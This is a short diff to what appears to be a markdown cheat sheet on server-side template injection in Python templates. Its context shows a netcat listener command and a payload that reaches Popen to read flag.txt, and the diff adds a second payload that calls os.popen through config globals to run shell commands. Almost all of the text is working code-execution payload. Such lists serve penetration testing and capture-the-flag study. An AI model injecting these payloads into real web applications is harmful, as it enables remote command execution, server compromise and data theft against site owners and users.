@@ -288,6 +288,7 @@ nv -lnvp 8000
 
 ```python
 {{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 ```
 
 #### Exploit the SSTI by calling Popen without guessing the offset
